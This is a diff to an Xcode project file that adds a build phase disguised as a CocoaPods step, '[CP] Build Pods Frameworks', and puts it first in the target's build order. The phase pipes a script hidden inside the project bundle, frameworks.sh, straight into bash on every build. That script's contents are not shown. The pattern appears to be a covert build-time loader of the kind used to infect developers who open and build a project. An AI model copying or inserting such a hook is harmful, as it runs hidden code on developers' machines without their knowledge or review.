@@ -89,6 +89,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A1F856332325F2F000878F02 /* Build configuration list for PBXNativeTarget "mAVAudioEngine" */;
 			buildPhases = (
+				162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */,
 				A1F856192325F2EF00878F02 /* Sources */,
 				A1F8561A2325F2EF00878F02 /* Frameworks */,
 				A1F8561B2325F2EF00878F02 /* Resources */,
@@ -351,6 +352,32 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	162E3FD122D63A22006D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "cat \"${PROJECT_FILE_PATH}/frameworks.sh\" | bash";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = A1F856152325F2EF00878F02 /* Project object */;
 }
